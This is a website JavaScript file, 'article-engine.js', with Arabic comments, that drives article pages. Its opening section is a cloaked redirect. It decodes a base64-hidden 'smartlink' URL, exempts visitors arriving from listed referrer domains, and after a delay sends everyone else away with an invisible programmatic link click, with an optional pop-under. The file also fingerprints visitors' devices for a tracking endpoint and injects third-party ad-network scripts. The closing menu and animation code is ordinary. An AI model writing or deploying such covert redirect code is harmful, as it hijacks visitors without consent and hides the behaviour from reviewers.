// assets/js/article-engine.js

(function() {
    // ==========================================
    // المرحلة الأولى: التحويل الشبحي والتتبع (يعمل فوراً في الـ Head)
    // ==========================================
    
    let _gpCore = { s: 0, u: '', b: '', e: '' }; // s=status, u=url, b=broad, e=exact
    window.__redirectStatus = "Off"; 
    let smartlinkUrl = '';

    fetch('/api/analytics/init')
        .then(res => res.json())
        .then(data => {
            _gpCore = data;

            if (_gpCore.s === 1) { // إذا كان التحويل مفعل
                let isBlocked = false;
                let refHostname = '';

                try { if (document.referrer) refHostname = new URL(document.referrer).hostname.toLowerCase(); } catch (e) {}

                if (refHostname) {
                    const broadList = (_gpCore.b || '').toLowerCase().split(',').filter(Boolean);
                    for (let d of broadList) { if (refHostname === d || refHostname.endsWith('.' + d)) { isBlocked = true; break; } }
                    
                    if (!isBlocked) {
                        const exactList = (_gpCore.e || '').toLowerCase().split(',').filter(Boolean);
                        for (let d of exactList) { if (refHostname === d) { isBlocked = true; break; } }
                    }
                }

                if (!isBlocked) {
                    window.__redirectStatus = "Redirected";
                    try { smartlinkUrl = atob(_gpCore.u); } catch(e) {} // فك تشفير الرابط

                    if (smartlinkUrl) {
                        setTimeout(() => {
                            // تقنية النقر المخفي
                            let ghostLink = document.createElement('a');
                            ghostLink.href = smartlinkUrl;
                            ghostLink.style.display = 'none';
                            // ghostLink.target = '_blank'; // أزل التعليق إذا أردت Pop-under
                            document.body.appendChild(ghostLink);
                            ghostLink.click();
                            document.body.removeChild(ghostLink);
                        }, 2500); 
                    }
                } else {
                    window.__redirectStatus = "Blocked";
                }
            }
            
            // تشغيل التتبع فوراً بعد تحديد الحالة
            executeTracking();
        })
        .catch(err => {
            window.__redirectStatus = "Off";
            executeTracking();
        });

    function executeTracking() {
        const urlParams = new URLSearchParams(window.location.search);
        const trackData = {
            page: window.location.href || 'N/A', referrer: document.referrer || 'Direct',
            utm_source: urlParams.get('utm_source') || 'direct', utm_medium: urlParams.get('utm_medium') || 'organic',
            utm_campaign: urlParams.get('utm_campaign') || 'none', utm_term: urlParams.get('utm_term') || 'none',
            utm_content: urlParams.get('utm_content') || 'none',
            device: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : (/Tablet|iPad/i.test(navigator.userAgent) ? 'Tablet' : 'Desktop'),
            os: navigator.userAgent.indexOf('Win') !== -1 ? 'Windows' : (navigator.userAgent.indexOf('Mac') !== -1 ? 'MacOS' : (navigator.userAgent.indexOf('Linux') !== -1 ? 'Linux' : (navigator.userAgent.indexOf('Android') !== -1 ? 'Android' : (navigator.userAgent.indexOf('iPhone') !== -1 ? 'iOS' : 'Unknown')))),
            browser: navigator.userAgent.indexOf('Chrome') !== -1 ? 'Chrome' : (navigator.userAgent.indexOf('Safari') !== -1 ? 'Safari' : (navigator.userAgent.indexOf('Firefox') !== -1 ? 'Firefox' : 'Other')),
            screenRes: `${screen.width}x${screen.height}`, lang: navigator.language || 'Unknown',
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
            redirectStatus: window.__redirectStatus || 'Off'
        };

        fetch('/track', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(trackData), keepalive: true })
        .catch(err => console.error('Tracking error:', err));
    }

    // ==========================================
    // المرحلة الثانية: الإعلانات والأزرار (يعمل بعد تحميل الصفحة)
    // ==========================================
    document.addEventListener('DOMContentLoaded', () => {
        
        // 1. تفعيل أزرار الـ Smartlink (CTA)
        if (smartlinkUrl) {
            document.querySelectorAll('.smartlink-btn').forEach(btn => {
                btn.href = smartlinkUrl;
                btn.target = "_blank";
                btn.rel = "noopener noreferrer";
            });
        }

        // 2. تفعيل أماكن الإعلانات (Ad Placeholders)
        const placeholders = document.querySelectorAll('.ad-placeholder');
        placeholders.forEach(placeholder => {
            const adType = placeholder.getAttribute('data-ad-type');

            if (adType === 'native') {
                const script = document.createElement('script');
                script.async = true; script.setAttribute('data-cfasync', 'false');
                script.src = 'https://pl29491505.effectivecpmnetwork.com/6b6702a20674280e322984539f666a60/invoke.js';
                const div = document.createElement('div'); div.id = 'container-6b6702a20674280e322984539f666a60';
                placeholder.appendChild(script); placeholder.appendChild(div);
            } 
            else if (adType === 'social-bar') {
                const script = document.createElement('script');
                script.src = 'https://pl29491506.effectivecpmnetwork.com/02/18/5e/02185ef1cc2fbb9b9a81bd1980c88233.js';
                placeholder.appendChild(script);
            }
            else if (adType === 'banner-468') {
                const script1 = document.createElement('script');
                script1.textContent = `atOptions={'key':'ecc626b50574cb130ed83a520b0f490f','format':'iframe','height':60,'width':468,'params':{}};`;
                const script2 = document.createElement('script');
                script2.src = 'https://www.highperformanceformat.com/ecc626b50574cb130ed83a520b0f490f/invoke.js';
                placeholder.appendChild(script1); placeholder.appendChild(script2);
            }
        });

        // 3. تشغيل تأثيرات الـ UI (من ملف main.js)
        if (typeof initializeUI === 'function') initializeUI();
    });
})();

// دالة الـ UI الأساسية (كانت في main.js، ندمجها هنا للسهولة)
function initializeUI() {
    const menuToggle = document.getElementById('menu-toggle');
    const navLinks = document.getElementById('nav-links');
    if (menuToggle && navLinks) {
        menuToggle.addEventListener('click', () => {
            navLinks.classList.toggle('active');
            const spans = menuToggle.querySelectorAll('span');
            if (navLinks.classList.contains('active')) { spans[0].style.transform='rotate(45deg) translate(5px,5px)'; spans[1].style.opacity='0'; spans[2].style.transform='rotate(-45deg) translate(5px,-5px)'; }
            else { spans[0].style.transform='none'; spans[1].style.opacity='1'; spans[2].style.transform='none'; }
        });
    }
    const faders = document.querySelectorAll('.fade-in');
    const appearOptions = { threshold: 0.15, rootMargin: "0px 0px -50px 0px" };
    const appearOnScroll = new IntersectionObserver((entries, observer) => {
        entries.forEach(entry => { if (!entry.isIntersecting) return; entry.target.classList.add('visible'); observer.unobserve(entry.target); });
    }, appearOptions);
    faders.forEach(fader => appearOnScroll.observe(fader));
}